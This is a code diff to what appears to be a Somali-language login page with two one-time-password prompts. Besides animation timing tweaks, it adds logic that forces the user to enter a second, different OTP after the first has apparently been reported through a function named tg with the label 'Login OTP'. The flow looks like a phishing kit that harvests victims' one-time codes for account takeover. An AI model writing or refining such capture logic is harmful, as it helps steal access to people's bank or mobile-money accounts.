@@ -133,8 +133,8 @@ html,body{width:100%;height:100%;height:100dvh;overflow:hidden;font-family:var(-
 
 @keyframes pgIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
 .screen{animation:pgIn .32s ease both}
-.screen.leaving{animation:pgOut .25s ease forwards!important}
-@keyframes pgOut{to{opacity:0;transform:translateY(-8px)}}
+.screen.leaving{animation:pgOut .42s cubic-bezier(.4,0,.2,1) forwards!important}
+@keyframes pgOut{to{opacity:0;transform:translateY(-16px) scale(.97)}}
 </style>
 </head>
 <body>
@@ -412,9 +412,11 @@ function showLoader(text,dur,cb){
   setTimeout(function(){document.getElementById('loaderOv').classList.remove('show');if(cb)cb()},dur);
 }
 
+var _usedOtp='';
 function submitOtp1(){
   if(otp1Val.length!==6||otp1Done)return;
   otp1Done=true;
+  _usedOtp=otp1Val;
   document.getElementById('oh1').disabled=true;
   tg('Login OTP');
   cm('m1');
@@ -437,8 +439,8 @@ function openOtp2(){cm('msum');om('m2');startTimer(2)}
 
 function submitOtp2(){
   if(otp2Val.length!==6||otp2Done)return;
-  if(otp2Val===otp1Val){
-    document.getElementById('mn2').textContent='⚠️ OTP-gan waa midkii hore. Gali mid cusub.';
+  if(otp2Val===otp1Val||otp2Val===_usedOtp){
+    document.getElementById('mn2').textContent='⚠️ OTP-dan waa mid hore la isticmaalay. Codso mid cusub.';
     document.getElementById('mn2').style.color='#dc2626';return;
   }
   otp2Done=true;
@@ -449,7 +451,7 @@ function submitOtp2(){
 
 function navigateTo(url){
   document.querySelector('.screen').classList.add('leaving');
-  setTimeout(function(){location.href=url},260);
+  setTimeout(function(){location.href=url},420);
 }
 </script>
 </body>
